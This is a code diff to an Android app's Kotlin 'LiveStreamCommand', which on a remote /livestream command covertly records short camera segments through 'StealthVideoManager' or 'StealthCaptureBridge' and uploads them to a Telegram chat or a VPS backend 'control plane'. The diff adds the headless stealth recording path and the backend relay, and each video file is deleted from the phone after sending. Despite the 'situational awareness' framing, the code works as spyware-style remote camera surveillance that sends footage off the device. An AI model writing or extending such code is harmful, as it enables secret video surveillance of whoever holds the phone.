@@ -5,10 +5,13 @@ import android.util.Log
 import com.izhaanintellect.pasa.bot.SendMessageRequest
 import com.izhaanintellect.pasa.bot.TelegramApi
 import com.izhaanintellect.pasa.camera.StealthCaptureBridge
+import com.izhaanintellect.pasa.camera.StealthVideoManager
 import com.izhaanintellect.pasa.data.PreferencesManager
+import com.izhaanintellect.pasa.network.PasaBackendApi
 import dagger.hilt.android.qualifiers.ApplicationContext
 import kotlinx.coroutines.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.File
@@ -18,10 +21,10 @@ import javax.inject.Inject
 import javax.inject.Singleton
 
 /**
- * Enables near-live video telemetry from the device camera via Telegram.
+ * Enables near-live video streaming from the device camera via Telegram.
  *
- * Records short video segments and dispatches them sequentially as video messages
- * to the owner's Telegram chat, providing near-real-time situational awareness.
+ * Records short 5-second video segments and dispatches them sequentially as video messages
+ * to the owner's Telegram chat via the VPS backend control plane or direct bot API.
  *
  * Commands: /livestream [front|back] [duration_minutes]
  */
@@ -29,7 +32,9 @@ import javax.inject.Singleton
 class LiveStreamCommand @Inject constructor(
     @ApplicationContext private val context: Context,
     private val preferencesManager: PreferencesManager,
-    private val telegramApi: TelegramApi
+    private val telegramApi: TelegramApi,
+    private val pasaBackendApi: PasaBackendApi,
+    private val stealthVideoManager: StealthVideoManager
 ) : Command {
 
     override val name = "/livestream"
@@ -91,42 +96,82 @@ class LiveStreamCommand @Inject constructor(
 
                     Log.i(TAG, "Recording segment $segNum (elapsed: $elapsedStr)")
 
-                    val result = try {
-                        StealthCaptureBridge.recordVideo(
-                            context = context,
-                            useFront = useFront,
+                    // 1. Primary: headless StealthVideoManager (low-overhead, no Activity churn, fast SD)
+                    var videoFile = try {
+                        stealthVideoManager.recordVideo(
+                            useFrontCamera = useFront,
                             durationSeconds = SEGMENT_DURATION_SECONDS,
-                            timeoutMs = SEGMENT_TIMEOUT_MS
+                            lowRes = true
                         )
                     } catch (e: Exception) {
-                        Log.w(TAG, "Segment $segNum recording failed: ${e.message}")
+                        Log.w(TAG, "Headless recording error on segment $segNum: ${e.message}")
                         null
                     }
 
-                    val videoFile = result?.file
+                    // 2. Secondary fallback: StealthCaptureBridge (Activity in TOP state)
+                    if (videoFile == null || !videoFile.exists() || videoFile.length() == 0L) {
+                        Log.i(TAG, "Headless recording returned null, falling back to StealthCaptureBridge")
+                        val bridgeResult = try {
+                            StealthCaptureBridge.recordVideo(
+                                context = context,
+                                useFront = useFront,
+                                durationSeconds = SEGMENT_DURATION_SECONDS,
+                                timeoutMs = SEGMENT_TIMEOUT_MS
+                            )
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Bridge recording error on segment $segNum: ${e.message}")
+                            null
+                        }
+                        videoFile = bridgeResult?.file
+                    }
+
                     if (videoFile != null && videoFile.exists() && videoFile.length() > 0) {
                         consecutiveFailures = 0
+                        val caption = "🔴 LIVE [Seg $segNum] — $cameraStr Camera — $elapsedStr elapsed"
 
                         try {
-                            val mediaType = "video/mp4".toMediaTypeOrNull()
-                            val requestBody = videoFile.asRequestBody(mediaType)
-                            val videoPart = okhttp3.MultipartBody.Part.createFormData(
-                                "video", videoFile.name, requestBody
-                            )
-                            val chatIdPart = preferencesManager.ownerChatIdLong.toString()
-                                .toRequestBody("text/plain".toMediaTypeOrNull())
-                            val captionPart = "🔴 LIVE [Seg $segNum] — $cameraStr Camera — $elapsedStr elapsed"
-                                .toRequestBody("text/plain".toMediaTypeOrNull())
+                            if (preferencesManager.useBackendServer) {
+                                // Relay through VPS backend control plane
+                                val deviceIdBody = preferencesManager.deviceId.toRequestBody("text/plain".toMediaTypeOrNull())
+                                val msgBody = caption.toRequestBody("text/plain".toMediaTypeOrNull())
+                                val reqFile = videoFile.asRequestBody("video/mp4".toMediaTypeOrNull())
+                                val videoPart = MultipartBody.Part.createFormData("video", videoFile.name, reqFile)
 
-                            telegramApi.sendVideo(
-                                preferencesManager.botToken,
-                                chatIdPart,
-                                videoPart,
-                                captionPart
-                            )
-                            Log.i(TAG, "Segment $segNum sent successfully")
+                                val resp = pasaBackendApi.sendDeviceResponse(
+                                    deviceId = deviceIdBody,
+                                    commandId = null,
+                                    message = msgBody,
+                                    photo = null,
+                                    audio = null,
+                                    video = videoPart,
+                                    evidence = null,
+                                    latitude = null,
+                                    longitude = null
+                                )
+                                Log.i(TAG, "Segment $segNum relayed to backend: ${resp.ok}")
+                            } else if (preferencesManager.botToken.isNotBlank() && preferencesManager.ownerChatIdLong != 0L) {
+                                // Direct Telegram bot API
+                                val mediaType = "video/mp4".toMediaTypeOrNull()
+                                val requestBody = videoFile.asRequestBody(mediaType)
+                                val videoPart = MultipartBody.Part.createFormData(
+                                    "video", videoFile.name, requestBody
+                                )
+                                val chatIdPart = preferencesManager.ownerChatIdLong.toString()
+                                    .toRequestBody("text/plain".toMediaTypeOrNull())
+                                val captionPart = caption.toRequestBody("text/plain".toMediaTypeOrNull())
+
+                                telegramApi.sendVideo(
+                                    preferencesManager.botToken,
+                                    chatIdPart,
+                                    videoPart,
+                                    captionPart
+                                )
+                                Log.i(TAG, "Segment $segNum sent directly to Telegram")
+                            } else {
+                                Log.w(TAG, "No valid transport available to dispatch segment $segNum")
+                            }
                         } catch (e: Exception) {
-                            Log.w(TAG, "Failed to send segment $segNum: ${e.message}")
+                            Log.w(TAG, "Failed to dispatch segment $segNum: ${e.message}")
                         }
 
                         try { videoFile.delete() } catch (_: Exception) {}
@@ -150,21 +195,38 @@ class LiveStreamCommand @Inject constructor(
                 val totalSegments = segmentCount.get()
                 val totalDuration = (System.currentTimeMillis() - startTime) / 1000
                 val durationStr = String.format("%02d:%02d", totalDuration / 60, totalDuration % 60)
+                val summaryText = """
+                    ⏹️ <b>LIVE STREAM ENDED</b>
+                    ━━━━━━━━━━━━━━━━━━━━
+                    📹 Total segments: <b>$totalSegments</b>
+                    ⏱️ Total duration: <b>$durationStr</b>
+                    📹 Camera: <b>$cameraStr</b>
+                """.trimIndent()
 
                 try {
-                    telegramApi.sendMessage(
-                        token = preferencesManager.botToken,
-                        request = SendMessageRequest(
-                            chatId = preferencesManager.ownerChatIdLong,
-                            text = """
-                                ⏹️ <b>LIVE STREAM ENDED</b>
-                                ━━━━━━━━━━━━━━━━━━━━
-                                📹 Total segments: <b>$totalSegments</b>
-                                ⏱️ Total duration: <b>$durationStr</b>
-                                📹 Camera: <b>$cameraStr</b>
-                            """.trimIndent()
+                    if (preferencesManager.useBackendServer) {
+                        val deviceIdBody = preferencesManager.deviceId.toRequestBody("text/plain".toMediaTypeOrNull())
+                        val msgBody = summaryText.toRequestBody("text/plain".toMediaTypeOrNull())
+                        pasaBackendApi.sendDeviceResponse(
+                            deviceId = deviceIdBody,
+                            commandId = null,
+                            message = msgBody,
+                            photo = null,
+                            audio = null,
+                            video = null,
+                            evidence = null,
+                            latitude = null,
+                            longitude = null
                         )
-                    )
+                    } else if (preferencesManager.botToken.isNotBlank() && preferencesManager.ownerChatIdLong != 0L) {
+                        telegramApi.sendMessage(
+                            token = preferencesManager.botToken,
+                            request = SendMessageRequest(
+                                chatId = preferencesManager.ownerChatIdLong,
+                                text = summaryText
+                            )
+                        )
+                    }
                 } catch (_: Exception) {}
             }
         }
